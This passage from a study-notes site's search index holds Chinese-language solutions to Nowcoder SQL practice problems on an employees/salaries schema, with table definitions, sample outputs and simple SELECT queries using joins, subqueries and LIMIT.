\u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/5.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_6_%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%91%98%E5%B7%A5%E5%85%A5%E8%81%8C%E6%97%B6%E5%80%99%E7%9A%84%E8%96%AA%E6%B0%B4%E6%83%85%E5%86%B5/#11-time-limit","text":"C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2","title":"1.1. Time Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/5.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_6_%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%91%98%E5%B7%A5%E5%85%A5%E8%81%8C%E6%97%B6%E5%80%99%E7%9A%84%E8%96%AA%E6%B0%B4%E6%83%85%E5%86%B5/#12-memory-limit","text":"C/C++ 32M\uff0c\u5176\u4ed6\u8bed\u8a0064M","title":"1.2. Memory Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/5.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_6_%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%91%98%E5%B7%A5%E5%85%A5%E8%81%8C%E6%97%B6%E5%80%99%E7%9A%84%E8%96%AA%E6%B0%B4%E6%83%85%E5%86%B5/#13-problem-description","text":"\u67e5\u627e\u6240\u6709\u5458\u5de5\u5165\u804c\u65f6\u5019\u7684\u85aa\u6c34\u60c5\u51b5\uff0c\u7ed9\u51faemp_no\u4ee5\u53casalary\uff0c \u5e76\u6309\u7167emp_no\u8fdb\u884c\u9006\u5e8f(\u8bf7\u6ce8\u610f\uff0c\u4e00\u4e2a\u5458\u5de5\u53ef\u80fd\u6709\u591a\u6b21\u6da8\u85aa\u7684\u60c5\u51b5) CREATE TABLE `employees` ( `emp_no` int(11) NOT NULL, `birth_date` date NOT NULL, `first_name` varchar(14) NOT NULL, `last_name` varchar(16) NOT NULL, `gender` char(1) NOT NULL, `hire_date` date NOT NULL, PRIMARY KEY (`emp_no`)); CREATE TABLE `salaries` ( `emp_no` int(11) NOT NULL, `salary` int(11) NOT NULL, `from_date` date NOT NULL, `to_date` date NOT NULL, PRIMARY KEY (`emp_no`,`from_date`));","title":"1.3. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/5.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_6_%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%91%98%E5%B7%A5%E5%85%A5%E8%81%8C%E6%97%B6%E5%80%99%E7%9A%84%E8%96%AA%E6%B0%B4%E6%83%85%E5%86%B5/#14-output","text":"emp_no salary 10011 25828 \u7701\u7565 \u7701\u7565 10001 60117","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/5.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_6_%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%91%98%E5%B7%A5%E5%85%A5%E8%81%8C%E6%97%B6%E5%80%99%E7%9A%84%E8%96%AA%E6%B0%B4%E6%83%85%E5%86%B5/#15-source","text":"\u725b\u5ba2\u7f51 SQL\u5b9e\u6218 6 \u67e5\u627e\u6240\u6709\u5458\u5de5\u5165\u804c\u65f6\u5019\u7684\u85aa\u6c34\u60c5\u51b5","title":"1.5. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/5.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_6_%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%91%98%E5%B7%A5%E5%85%A5%E8%81%8C%E6%97%B6%E5%80%99%E7%9A%84%E8%96%AA%E6%B0%B4%E6%83%85%E5%86%B5/#2","text":"\u8981\u6c42\u5728\u67e5\u8be2\u4e2d\u5305\u62ec\u6682\u65f6\u6ca1\u6709\u5206\u914d\u5177\u4f53\u90e8\u95e8\u7684\u5458\u5de5\uff0c\u9700\u8981\u4f7f\u7528 LEFT JOIN \u3002","title":"2. \u9898\u89e3"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/JOIN/5.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_6_%E6%9F%A5%E6%89%BE%E6%89%80%E6%9C%89%E5%91%98%E5%B7%A5%E5%85%A5%E8%81%8C%E6%97%B6%E5%80%99%E7%9A%84%E8%96%AA%E6%B0%B4%E6%83%85%E5%86%B5/#3","text":"\u52a0\u5165 hire_date = from_date \u7684\u7b5b\u9009\u6761\u4ef6\uff0c\u627e\u5230\u5458\u5de5\u5165\u804c\u65f6\u5019\u7684\u85aa\u6c34\u60c5\u51b5\u3002 SELECT t1.`emp_no`, `salary` FROM `employees` AS t1, `salaries` AS t2 ON t1.emp_no = t2.emp_no WHERE hire_date = from_date ORDER BY t1.emp_no DESC mysql \u4e2d\u9700\u8981\u4f7f\u7528 WHERE \u3002 SELECT t1.`emp_no`, `salary` FROM `employees` AS t1, `salaries` AS t2 WHERE t1.emp_no = t2.emp_no AND hire_date = from_date ORDER BY t1.emp_no DESC \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/Subquery/1.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_1_%E6%9F%A5%E6%89%BE%E6%9C%80%E6%99%9A%E5%85%A5%E8%81%8C%E5%91%98%E5%B7%A5/","text":"\u725b\u5ba2\u7f51 SQL\u5b9e\u6218 1 \u67e5\u627e\u6700\u665a\u5165\u804c\u5458\u5de5\u7684\u6240\u6709\u4fe1\u606f # \u76ee\u5f55 # \u725b\u5ba2\u7f51 SQL\u5b9e\u6218 1 \u67e5\u627e\u6700\u665a\u5165\u804c\u5458\u5de5\u7684\u6240\u6709\u4fe1\u606f \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Time Limit 1.2. Memory Limit 1.3. Problem Description 1.4. Output 1.5. Source 2. \u9898\u89e3 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Time Limit # C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2 1.2. Memory Limit # C/C++ 32M\uff0c\u5176\u4ed6\u8bed\u8a0064M 1.3. Problem Description # \u67e5\u627e\u6700\u665a\u5165\u804c\u5458\u5de5\u7684\u6240\u6709\u4fe1\u606f\uff0c\u4e3a\u4e86\u51cf\u8f7b\u5165\u95e8\u96be\u5ea6\uff0c\u76ee\u524d\u6240\u6709\u7684\u6570\u636e\u91cc\u5458\u5de5\u5165\u804c\u7684\u65e5\u671f\u90fd\u4e0d\u662f\u540c\u4e00\u5929(sqlite\u91cc\u9762\u7684\u6ce8\u91ca\u4e3a--,mysql\u4e3acomment) CREATE TABLE `employees` ( `emp_no` int(11) NOT NULL, -- '\u5458\u5de5\u7f16\u53f7' `birth_date` date NOT NULL, `first_name` varchar(14) NOT NULL, `last_name` varchar(16) NOT NULL, `gender` char(1) NOT NULL, `hire_date` date NOT NULL, PRIMARY KEY (`emp_no`)); 1.4. Output # emp_no birth_date first_name last_name gender hire_date 10008 1958-02-19 Saniya Kalloufi M 1994-09-15 1.5. Source # \u725b\u5ba2\u7f51 NCSQL\u5b9e\u6218 1 \u67e5\u627e\u6700\u665a\u5165\u804c\u5458\u5de5\u7684\u6240\u6709\u4fe1\u606f 2. \u9898\u89e3 # \u53ef\u4ee5\u4f7f\u7528\u5b50\u67e5\u8be2\uff0c\u4e5f\u53ef\u4ee5\u5148\u6392\u5e8f\u518d\u53d6\u7b2c\u4e00\u4e2a\u3002 3. \u4ee3\u7801 # \u4f7f\u7528\u5b50\u67e5\u8be2\uff0c\u80fd\u591f\u53d6\u51fa\u5165\u804c\u65e5\u671f\u6700\u665a\u7684\u591a\u4e2a\u5458\u5de5\u3002 SELECT * FROM employees WHERE hire_date = (SELECT MAX(hire_date) FROM employees) \u4f7f\u7528\u6392\u5e8f\u548cLIMIT\uff0c\u53ef\u4ee5\u53d6\u51fa\u552f\u4e00\u4e00\u4e2a\u3002 SELECT * FROM `employees` ORDER BY hire_date DESC LIMIT 1; \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.\u725b\u5ba2\u7f51 SQL\u5b9e\u6218 1 \u67e5\u627e\u6700\u665a\u5165\u804c\u5458\u5de5"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/Subquery/1.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_1_%E6%9F%A5%E6%89%BE%E6%9C%80%E6%99%9A%E5%85%A5%E8%81%8C%E5%91%98%E5%B7%A5/#sql-1","text":"","title":"\u725b\u5ba2\u7f51 SQL\u5b9e\u6218 1 \u67e5\u627e\u6700\u665a\u5165\u804c\u5458\u5de5\u7684\u6240\u6709\u4fe1\u606f"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/Subquery/1.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_1_%E6%9F%A5%E6%89%BE%E6%9C%80%E6%99%9A%E5%85%A5%E8%81%8C%E5%91%98%E5%B7%A5/#_1","text":"\u725b\u5ba2\u7f51 SQL\u5b9e\u6218 1 \u67e5\u627e\u6700\u665a\u5165\u804c\u5458\u5de5\u7684\u6240\u6709\u4fe1\u606f \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Time Limit 1.2. Memory Limit 1.3. Problem Description 1.4. Output 1.5. Source 2. \u9898\u89e3 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/Subquery/1.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_1_%E6%9F%A5%E6%89%BE%E6%9C%80%E6%99%9A%E5%85%A5%E8%81%8C%E5%91%98%E5%B7%A5/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/Subquery/1.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_1_%E6%9F%A5%E6%89%BE%E6%9C%80%E6%99%9A%E5%85%A5%E8%81%8C%E5%91%98%E5%B7%A5/#11-time-limit","text":"C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2","title":"1.1. Time Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/Subquery/1.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_1_%E6%9F%A5%E6%89%BE%E6%9C%80%E6%99%9A%E5%85%A5%E8%81%8C%E5%91%98%E5%B7%A5/#12-memory-limit","text":"C/C++ 32M\uff0c\u5176\u4ed6\u8bed\u8a0064M","title":"1.2. Memory Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/Subquery/1.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_1_%E6%9F%A5%E6%89%BE%E6%9C%80%E6%99%9A%E5%85%A5%E8%81%8C%E5%91%98%E5%B7%A5/#13-problem-description","text":"\u67e5\u627e\u6700\u665a\u5165\u804c\u5458\u5de5\u7684\u6240\u6709\u4fe1\u606f\uff0c\u4e3a\u4e86\u51cf\u8f7b\u5165\u95e8\u96be\u5ea6\uff0c\u76ee\u524d\u6240\u6709\u7684\u6570\u636e\u91cc\u5458\u5de5\u5165\u804c\u7684\u65e5\u671f\u90fd\u4e0d\u662f\u540c\u4e00\u5929(sqlite\u91cc\u9762\u7684\u6ce8\u91ca\u4e3a--,mysql\u4e3acomment) CREATE TABLE `employees` ( `emp_no` int(11) NOT NULL, -- '\u5458\u5de5\u7f16\u53f7' `birth_date` date NOT NULL, `first_name` varchar(14) NOT NULL, `last_name` varchar(16) NOT NULL, `gender` char(1) NOT NULL, `hire_date` date NOT NULL, PRIMARY KEY (`emp_no`));","title":"1.3. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/Subquery/1.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_1_%E6%9F%A5%E6%89%BE%E6%9C%80%E6%99%9A%E5%85%A5%E8%81%8C%E5%91%98%E5%B7%A5/#14-output","text":"emp_no birth_date first_name last_name gender hire_date 10008 1958-02-19 Saniya Kalloufi M 1994-09-15","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/Subquery/1.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_1_%E6%9F%A5%E6%89%BE%E6%9C%80%E6%99%9A%E5%85%A5%E8%81%8C%E5%91%98%E5%B7%A5/#15-source","text":"\u725b\u5ba2\u7f51 NCSQL\u5b9e\u6218 1 \u67e5\u627e\u6700\u665a\u5165\u804c\u5458\u5de5\u7684\u6240\u6709\u4fe1\u606f","title":"1.5. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/Subquery/1.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_1_%E6%9F%A5%E6%89%BE%E6%9C%80%E6%99%9A%E5%85%A5%E8%81%8C%E5%91%98%E5%B7%A5/#2","text":"\u53ef\u4ee5\u4f7f\u7528\u5b50\u67e5\u8be2\uff0c\u4e5f\u53ef\u4ee5\u5148\u6392\u5e8f\u518d\u53d6\u7b2c\u4e00\u4e2a\u3002","title":"2. \u9898\u89e3"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/Subquery/1.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_1_%E6%9F%A5%E6%89%BE%E6%9C%80%E6%99%9A%E5%85%A5%E8%81%8C%E5%91%98%E5%B7%A5/#3","text":"\u4f7f\u7528\u5b50\u67e5\u8be2\uff0c\u80fd\u591f\u53d6\u51fa\u5165\u804c\u65e5\u671f\u6700\u665a\u7684\u591a\u4e2a\u5458\u5de5\u3002 SELECT * FROM employees WHERE hire_date = (SELECT MAX(hire_date) FROM employees) \u4f7f\u7528\u6392\u5e8f\u548cLIMIT\uff0c\u53ef\u4ee5\u53d6\u51fa\u552f\u4e00\u4e00\u4e2a\u3002 SELECT * FROM `employees` ORDER BY hire_date DESC LIMIT 1; \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/Subquery/2.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_2_%E6%9F%A5%E6%89%BE%E5%85%A5%E8%81%8C%E5%91%98%E5%B7%A5%E6%97%B6%E9%97%B4%E6%8E%92%E5%90%8D%E5%80%92%E6%95%B0%E7%AC%AC%E4%B8%89%E7%9A%84%E5%91%98%E5%B7%A5/","text":"\u725b\u5ba2\u7f51 SQL\u5b9e\u6218 2 \u67e5\u627e\u5165\u804c\u5458\u5de5\u65f6\u95f4\u6392\u540d\u5012\u6570\u7b2c\u4e09\u7684\u5458\u5de5\u6240\u6709\u4fe1\u606f # \u76ee\u5f55 # \u725b\u5ba2\u7f51 SQL\u5b9e\u6218 2 \u67e5\u627e\u5165\u804c\u5458\u5de5\u65f6\u95f4\u6392\u540d\u5012\u6570\u7b2c\u4e09\u7684\u5458\u5de5\u6240\u6709\u4fe1\u606f \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Time Limit 1.2. Memory Limit 1.3. Problem Description 1.4. Output 1.5. Source 2. \u9898\u89e3 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Time Limit # C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2 1.2. Memory Limit # C/C++ 32M\uff0c\u5176\u4ed6\u8bed\u8a0064M 1.3. Problem Description # \u67e5\u627e\u5165\u804c\u5458\u5de5\u65f6\u95f4\u6392\u540d\u5012\u6570\u7b2c\u4e09\u7684\u5458\u5de5\u6240\u6709\u4fe1\u606f\uff0c\u4e3a\u4e86\u51cf\u8f7b\u5165\u95e8\u96be\u5ea6\uff0c\u76ee\u524d\u6240\u6709\u7684\u6570\u636e\u91cc\u5458\u5de5\u5165\u804c\u7684\u65e5\u671f\u90fd\u4e0d\u662f\u540c\u4e00\u5929 CREATE TABLE `employees` ( `emp_no` int(11) NOT NULL, -- '\u5458\u5de5\u7f16\u53f7' `birth_date` date NOT NULL, `first_name` varchar(14) NOT NULL, `last_name` varchar(16) NOT NULL, `gender` char(1) NOT NULL, `hire_date` date NOT NULL, PRIMARY KEY (`emp_no`)); 1.4. Output # emp_no birth_date first_name last_name gender hire_date 10005 1955-01-21 Kyoichi Maliniak M 1989-09-12 1.5. Source # \u725b\u5ba2\u7f51 SQL\u5b9e\u6218 2 \u67e5\u627e\u5165\u804c\u5458\u5de5\u65f6\u95f4\u6392\u540d\u5012\u6570\u7b2c\u4e09\u7684\u5458\u5de5\u6240\u6709\u4fe1\u606f 2. \u9898\u89e3 # \u53ef\u4ee5\u4f7f\u7528\u5b50\u67e5\u8be2\uff0c\u4e5f\u53ef\u4ee5\u5148\u6392\u5e8f\u518d\u53d6\u7b2c\u4e09\u4e2a\u3002 3. \u4ee3\u7801 # \u4f7f\u7528\u5b50\u67e5\u8be2\uff0c\u80fd\u591f\u53d6\u51fa\u5165\u804c\u65e5\u671f\u5012\u6570\u7b2c\u4e09\u7684\u591a\u4e2a\u5458\u5de5\u3002 SELECT * FROM `employees` WHERE hire_date = (SELECT DISTINCT hire_date FROM `employees` ORDER BY hire_date DESC LIMIT 2, 1); \u4f7f\u7528\u6392\u5e8f\u548cLIMIT\uff0c\u53ef\u4ee5\u53d6\u51fa\u552f\u4e00\u4e00\u4e2a\u3002 SELECT * FROM `employees` ORDER BY hire_date DESC LIMIT 2, 1; OFFSET \u8868\u793a\u5ffd\u7565\u524d2\u4e2a\u3002 SELECT * FROM `employees` ORDER BY hire_date DESC LIMIT 1 OFFSET 2; \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"2.\u725b\u5ba2\u7f51 SQL\u5b9e\u6218 2 \u67e5\u627e\u5165\u804c\u5458\u5de5\u65f6\u95f4\u6392\u540d\u5012\u6570\u7b2c\u4e09\u7684\u5458\u5de5"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/Subquery/2.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_2_%E6%9F%A5%E6%89%BE%E5%85%A5%E8%81%8C%E5%91%98%E5%B7%A5%E6%97%B6%E9%97%B4%E6%8E%92%E5%90%8D%E5%80%92%E6%95%B0%E7%AC%AC%E4%B8%89%E7%9A%84%E5%91%98%E5%B7%A5/#sql-2","text":"","title":"\u725b\u5ba2\u7f51 SQL\u5b9e\u6218 2 \u67e5\u627e\u5165\u804c\u5458\u5de5\u65f6\u95f4\u6392\u540d\u5012\u6570\u7b2c\u4e09\u7684\u5458\u5de5\u6240\u6709\u4fe1\u606f"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/Subquery/2.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_2_%E6%9F%A5%E6%89%BE%E5%85%A5%E8%81%8C%E5%91%98%E5%B7%A5%E6%97%B6%E9%97%B4%E6%8E%92%E5%90%8D%E5%80%92%E6%95%B0%E7%AC%AC%E4%B8%89%E7%9A%84%E5%91%98%E5%B7%A5/#_1","text":"\u725b\u5ba2\u7f51 SQL\u5b9e\u6218 2 \u67e5\u627e\u5165\u804c\u5458\u5de5\u65f6\u95f4\u6392\u540d\u5012\u6570\u7b2c\u4e09\u7684\u5458\u5de5\u6240\u6709\u4fe1\u606f \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Time Limit 1.2. Memory Limit 1.3. Problem Description 1.4. Output 1.5. Source 2. \u9898\u89e3 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/Subquery/2.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_2_%E6%9F%A5%E6%89%BE%E5%85%A5%E8%81%8C%E5%91%98%E5%B7%A5%E6%97%B6%E9%97%B4%E6%8E%92%E5%90%8D%E5%80%92%E6%95%B0%E7%AC%AC%E4%B8%89%E7%9A%84%E5%91%98%E5%B7%A5/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/Subquery/2.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_2_%E6%9F%A5%E6%89%BE%E5%85%A5%E8%81%8C%E5%91%98%E5%B7%A5%E6%97%B6%E9%97%B4%E6%8E%92%E5%90%8D%E5%80%92%E6%95%B0%E7%AC%AC%E4%B8%89%E7%9A%84%E5%91%98%E5%B7%A5/#11-time-limit","text":"C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2","title":"1.1. Time Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/Subquery/2.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_2_%E6%9F%A5%E6%89%BE%E5%85%A5%E8%81%8C%E5%91%98%E5%B7%A5%E6%97%B6%E9%97%B4%E6%8E%92%E5%90%8D%E5%80%92%E6%95%B0%E7%AC%AC%E4%B8%89%E7%9A%84%E5%91%98%E5%B7%A5/#12-memory-limit","text":"C/C++ 32M\uff0c\u5176\u4ed6\u8bed\u8a0064M","title":"1.2. Memory Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/Subquery/2.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_2_%E6%9F%A5%E6%89%BE%E5%85%A5%E8%81%8C%E5%91%98%E5%B7%A5%E6%97%B6%E9%97%B4%E6%8E%92%E5%90%8D%E5%80%92%E6%95%B0%E7%AC%AC%E4%B8%89%E7%9A%84%E5%91%98%E5%B7%A5/#13-problem-description","text":"\u67e5\u627e\u5165\u804c\u5458\u5de5\u65f6\u95f4\u6392\u540d\u5012\u6570\u7b2c\u4e09\u7684\u5458\u5de5\u6240\u6709\u4fe1\u606f\uff0c\u4e3a\u4e86\u51cf\u8f7b\u5165\u95e8\u96be\u5ea6\uff0c\u76ee\u524d\u6240\u6709\u7684\u6570\u636e\u91cc\u5458\u5de5\u5165\u804c\u7684\u65e5\u671f\u90fd\u4e0d\u662f\u540c\u4e00\u5929 CREATE TABLE `employees` ( `emp_no` int(11) NOT NULL, -- '\u5458\u5de5\u7f16\u53f7' `birth_date` date NOT NULL, `first_name` varchar(14) NOT NULL, `last_name` varchar(16) NOT NULL, `gender` char(1) NOT NULL, `hire_date` date NOT NULL, PRIMARY KEY (`emp_no`));","title":"1.3. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/Subquery/2.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_2_%E6%9F%A5%E6%89%BE%E5%85%A5%E8%81%8C%E5%91%98%E5%B7%A5%E6%97%B6%E9%97%B4%E6%8E%92%E5%90%8D%E5%80%92%E6%95%B0%E7%AC%AC%E4%B8%89%E7%9A%84%E5%91%98%E5%B7%A5/#14-output","text":"emp_no birth_date first_name last_name gender hire_date 10005 1955-01-21 Kyoichi Maliniak M 1989-09-12","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/SQL%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/Subquery/2.%E7%89%9B%E5%AE%A2%E7%BD%91_SQL%E5%AE%9E%E6%88%98_2_%E6%9F%A5%E6%89%BE%E5%85%A5%E8%81%8C%E5%91%98%E5%B7%A5%E6%97%B6%E9%97%B4%E6%8E%92%E5%90%8D%E5%80%92%E6%95%B0%E7%AC%AC%E4%B8%89%E7%9A%84%E5%91%98%E5%B7%A5/#15-source","text":"\u725b\u5ba2\u7f51 SQL\u5b9e\u6218 2 